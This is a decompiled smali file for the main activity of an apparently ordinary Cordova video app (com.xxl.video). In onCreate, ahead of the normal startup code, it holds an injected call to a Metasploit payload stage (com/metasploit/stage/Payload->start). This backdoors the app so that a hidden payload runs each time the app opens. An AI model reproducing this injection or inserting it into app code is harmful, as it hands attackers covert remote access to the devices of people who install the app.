.class public Lcom/xxl/video/MainActivity;
.super Lorg/apache/cordova/CordovaActivity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 28
    invoke-direct {p0}, Lorg/apache/cordova/CordovaActivity;-><init>()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    .prologue
    .line 32
    invoke-super {p0, p1}, Lorg/apache/cordova/CordovaActivity;->onCreate(Landroid/os/Bundle;)V

    .line 34
    invoke-virtual {p0}, Lcom/xxl/video/MainActivity;->getIntent()Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 35
    .local v0, "extras":Landroid/os/Bundle;
    if-eqz v0, :cond_0

    const-string v1, "cdvStartInBackground"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 36
    const/4 v1, 0x1

    invoke-virtual {p0, v1}, Lcom/xxl/video/MainActivity;->moveTaskToBack(Z)Z

    .line 38
    :cond_0
    const-string v1, "open"

    invoke-static {p0, v1}, Lcom/xxl/video/AppEventsFacebook;->logSendEvent(Landroid/content/Context;Ljava/lang/String;)V

    .line 40
    iget-object v1, p0, Lcom/xxl/video/MainActivity;->launchUrl:Ljava/lang/String;

    invoke-virtual {p0, v1}, Lcom/xxl/video/MainActivity;->loadUrl(Ljava/lang/String;)V

    .line 42
    return-void
.end method
